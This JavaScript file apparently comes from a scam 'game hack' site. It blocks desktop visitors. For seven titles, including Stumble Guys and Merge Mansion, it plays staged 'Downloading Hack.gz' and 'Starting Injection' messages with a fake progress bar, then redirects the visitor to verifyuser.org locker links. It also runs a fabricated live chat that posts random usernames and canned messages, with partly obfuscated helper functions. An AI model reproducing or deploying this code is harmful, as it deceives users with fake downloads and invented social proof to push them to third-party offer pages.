$(document).ready(function() {
    $('.nav-wrapper li').click(function() {
        $('.nav-wrapper li').removeClass('active');
        $(this).addClass('active');
        var active = $('.nav-wrapper li.active span').text();
        makeactive(active);
    });

    var bWidth = $(window).width();

    if (bWidth > 580) {
        $('body').html('<section class="s-wrapper desktop">\
					<div class="container">\
						<div class="d-notice-wrapper">\
							<div class="d-notice">\
								<span class="material-icons-two-tone mid1">phone_iphone</span>\
								<h1>Mobile Device Not Detected</h1>\
								<p>Looks like you are trying to access this website from a desktop/laptop device.</p>\
								<div class="d-n-i">\
									<span class="material-icons-two-tone mid2">info</span>\
									Please re-visit this website from your mobile device.\
								</div>\
							</div>\
						</div>\
					</div>\
				</section>');
    }

});
$(document).ready(function() {
	$('#blurred-resources').click(function() {
		sweetAlert("Error", "Please enter your Username and select your platform.", "error");
	});
	function progressBar(percent, $element) {
		var progressBarWidth = percent * $element.width() / 100;
		$element.find('div').animate({
			width: progressBarWidth
		}, 500).html(percent + "%&nbsp;");
	}
	function progressBarConsole(percent, $element) {
		var progressBarConsoleWidth = percent * $element.width() / 100;
		$element.find('div').animate({
			width: progressBarConsoleWidth
		}, 500).html(percent + "%&nbsp;");
	}
	
	$('.start1-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$(".message-content p.console-message").fadeIn();
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Downloading Don't Starve Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(20, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Don't Starve Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(40, $('#progressBarConsole'));
				}
			});
		}, 5000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Starting Injection"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 10000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Setting Up Final Stage"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
			window.location.href="https://verifyuser.org/cl/i/j6redp";
		}, 15000);
	});
	$('.start2-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$(".message-content p.console-message").fadeIn();
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Downloading Minecraft++ Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(20, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Minecraft++ Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(40, $('#progressBarConsole'));
				}
			});
		}, 5000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Starting Injection"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 10000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Setting Up Final Stage"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
			window.location.href="https://verifyuser.org/cl/i/5kpj7v";
		}, 15000);
	});
	$('.start3-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$(".message-content p.console-message").fadeIn();
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Downloading Cooking Madness Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(20, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Cooking Madness Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(40, $('#progressBarConsole'));
				}
			});
		}, 5000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Starting Injection"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 10000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Setting Up Final Stage"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
			window.location.href="https://verifyuser.org/cl/i/e6lork";
		}, 15000);
	});
	$('.start4-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$(".message-content p.console-message").fadeIn();
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Downloading Merge Villa Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(20, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Merge Villa Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(40, $('#progressBarConsole'));
				}
			});
		}, 5000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Starting Injection"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 10000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Setting Up Final Stage"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
			window.location.href="https://verifyuser.org/cl/i/kl7ngg";
		}, 15000);
	});
	$('.start5-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$(".message-content p.console-message").fadeIn();
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Downloading Merge Mansion Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(20, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Merge Mansion Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(40, $('#progressBarConsole'));
				}
			});
		}, 5000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Starting Injection"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 10000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Setting Up Final Stage"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
			window.location.href="https://verifyuser.org/cl/i/m4rlw";
		}, 15000);
	});
	$('.start6-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$(".message-content p.console-message").fadeIn();
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Downloading Dragonscapes Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(20, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Dragonscapes Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(40, $('#progressBarConsole'));
				}
			});
		}, 5000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Starting Injection"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 10000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Setting Up Final Stage"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
			window.location.href="https://verifyuser.org/cl/i/kjg8e";
		}, 15000);
	});
	$('.start7-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$(".message-content p.console-message").fadeIn();
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Downloading Stumble Guys Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(20, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Stumble Guys Hack.gz"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(40, $('#progressBarConsole'));
				}
			});
		}, 5000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Starting Injection"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 10000);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Setting Up Final Stage"],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
			window.location.href="https://verifyuser.org/cl/i/klkg19";
		}, 15000);
	});
	
	
	
	$('.popup-tos').magnificPopup({
		type: 'inline',
		preloader: false
	});
	$('.popup-contact').magnificPopup({
		type: 'inline',
		preloader: false
	});
	$('.popup-pp').magnificPopup({
		type: 'inline',
		preloader: false
	});
	$("#video-wrapper").fitVids();
});
var ee;
var eenum2 = 334;
Date.prototype.getFullMinutes = function() {
	if (this.getMinutes() < 10) {
		return '0' + this.getMinutes();
	}
	return this.getMinutes();
};
function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);
}
$(function() {
	$('#livechatInputComment').focus(function() {
		$('#livechatContainerAdditional').slideDown(500);
	});
});
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};

function ChatAddEntry(_0xaa63x5, _0xaa63x6) {
	if (_0xaa63x5 == '' || _0xaa63x6 == '') {
		return;
	};
	$('<div class=\"livechatChatEntry\"><span class=\"livechatEntryUserName\">[' + ChatDate.getHours() + ':' + ChatDate.getFullMinutes() + ']  ' + _0xaa63x5 + ':</span><span class=\"livechatEntryContent\">' + _0xaa63x6 + '</span></div>')['appendTo']('#livechatChatContent')['hide'](0)['fadeIn'](250);
	$('#livechatChatContent')['scrollTop']($('#livechatChatContent')[0]['scrollHeight']);
};

function ChatLog(_0xaa63x6) {
	$('<div class=\"livechatChatEntry\"><span class=\"ChatNotification\">' + _0xaa63x6 + '</span></div>')['appendTo']('#livechatChatContent')['hide'](0)['fadeIn'](250);
	$('#livechatChatContent')['scrollTop']($('#livechatChatContent')[0]['scrollHeight']);
};

function ChatStart() {
	var _0xaa63x8 = function() {
		setTimeout(function() {
			var _0xaa63x9 = ChatUserNames[Random(0, ChatUserNames['length'] - 1)];
			var _0xaa63xa = ChatContent[Random(0, ChatContent['length'] - 1)];
			ChatAddEntry(_0xaa63x9, _0xaa63xa);
			_0xaa63x8();
		}, Random(1000, 15000));
	};
	_0xaa63x8();
};